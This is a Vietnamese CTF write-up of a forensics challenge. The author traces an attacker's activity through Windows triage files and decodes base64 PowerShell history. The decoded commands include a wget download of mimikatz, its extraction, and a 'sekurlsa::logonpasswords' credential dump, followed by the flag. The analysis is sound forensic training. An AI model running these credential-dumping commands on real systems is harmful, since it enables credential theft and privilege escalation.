# landfall-utfctf

![image.png](Last%20Byte%20Standing-utfctf/image.png)

Bài này cung cấp cho chúng ta 4 file 2 file txt 1 file zip và 1 file KAPE đối với 2 file text

```python
➜  utfctf cat briefing.txt
Hello operator, in the .zip file is a triage of the desktop breached by the
threat actors. It seems like they were able to physically login, so we think
there's an insider threat amongst the employees.

Checkpoint A: What command did the threat actor attempt to execute to
obtain credentials for privilege escalation?

Hint: The password to Checkpoint A is ONLY the encoded portion. The password
is MD5 hash of this portion.%                                                                                           ➜  utfctf cat how-to-solve.txt
To obtain the flag, you must obtain the password to the "Checkpoint A"
zip file. The password is associated with the problem assigned in the briefing.% 
```

Đề này là một bài **Digital Forensics / Incident Response (DFIR)** dạng **phân tích file triage** của một máy Windows đã bị xâm nhập.

Hiểu đơn giản, đề đang đặt bạn vào vai điều tra viên:

- Công ty bị tấn công.
- Bạn không có full disk image, mà chỉ có **triage collection**.
- Nhiệm vụ là đọc “briefing” rồi moi từ các artefact Windows ra hành vi của attacker.

**“KAPE triage files”** nghĩa là gì?

Đó là một bộ file điều tra được thu thập sẵn từ máy nạn nhân bằng KAPE, thường gồm những artefact quan trọng như user profile, history, log, recycle bin, registry, timeline, browser data, PowerShell history… Mục tiêu là bạn không điều tra trực tiếp trên máy sống, mà điều tra trên các dấu vết đã được gom lại. Đề đang thực sự bắt bạn làm gì

Với riêng **Landfall**, ý nghĩa của bài là:

1. **Đọc briefing** để hiểu attacker đã làm gì ở mức cao.
2. **Xác định user / artefact phù hợp** để xem attacker đã gõ lệnh gì.
    
    Hướng đúng là kiểm tra PowerShell history của các user, đặc biệt file:
    
    `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    
3. **Nhận ra attacker dùng lệnh PowerShell mã hóa Base64**.
    
    Trong history có nhiều lệnh kiểu `powershell -e ...` hoặc `-nop -e ...`, tức là lệnh thật đã bị encode. Bạn phải decode chúng để xem attacker đã tải gì, giải nén gì, và cuối cùng chạy gì.
    
4. **Tìm lệnh phục vụ leo thang đặc quyền / lấy credential**.

### Tên “Landfall” nên hiểu thế nào

“Landfall” ở đây mang nghĩa kiểu **attacker đã “đổ bộ” vào hệ thống** và bạn đang điều tra giai đoạn đầu của intrusion: họ tải công cụ, giải nén, rồi cố lấy credential để nâng quyền. Nó không phải bài crypto hay reverse; trọng tâm là **timeline + artefact hunting**.

### Tư duy giải bài đúng

Khi gặp đề như này, bạn nên nghĩ theo chuỗi:

**briefing → user activity → shell history → decode command → xác định tool/hành vi → trả lời đúng format đề**

Chứ không nên mở ngẫu nhiên mọi file trong zip.

![image.png](Last%20Byte%20Standing-utfctf/image%201.png)

Đầu tiên mình vào với user là administrator  mình vào xem bằng đường dẫn

C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline

đọc file consolehost_history.txt thì mình thấy ở đây có mỗi lệnh cat thôi chứ cũng không có gì

Tiếp đến là mình kahi thác tiếp vào người dùng john

C\Users\jon\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\consolehost_history.txt

![image.png](Last%20Byte%20Standing-utfctf/image%202.png)

Ở đây khi mà vòa thì mình thấy khá nhiều đoạn đã bị encode base64 rất giống với yêu cầu đề bài nên là ở đây thì mình sẽ tiếp tục decode lần lượt từng chuỗi base64 này xem có gì ở những chuỗi base64 này không

```python
➜  utfctf echo 'dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwAA==' | base64 -d
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip% 
➜  utfctf echo 'dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwACAALQBPACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA' | base64 -d
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimikatz.zip%        
➜  utfctf echo 'RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA' | base64 -d
Expand-Archive mimikatz.zip%                                                                                           
 ➜  utfctf echo '' | base64 -d
➜  utfctf echo 'RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA' | base64 -d
Expand-Archive mimikatz.zip%                                                                                           
 ➜  utfctf echo 'QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==' | base64 -d
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"%                 
 ➜  utfctf
```

Ở đây sau khi decode mình sẽ thấy có vẻ như hacker đã truy cập vào máy nạn nhận sau đó dùng whoami check xem đang là ai sau đó hacker và thư mục download tiến hành tải 1 file zip có vẻ như là mã đọc từ trên github về sau đó là hacker giải nén và tiến hành chạy đoạn mã đọc đó ngay trên máy nạn nhân kết hợp với miêu tả đề bài thì mật khẩu fiel zip là đoạn code bị mã hóa thì mình sẽ thử với base64 cảu doạn cuối cùng vị đoạn này là nó có hiện fiel mã dudocj được thực thi và cso pass logon trông khá đáng nghi

```python
➜  utfctf unzip checkpointA.zip                                                                                         Archive:  checkpointA.zip
[checkpointA.zip] flag.txt password:
 extracting: flag.txt
➜  utfctf cat flag.txt
utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}%                                                                                   ➜  utfctf
```

flag: utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}
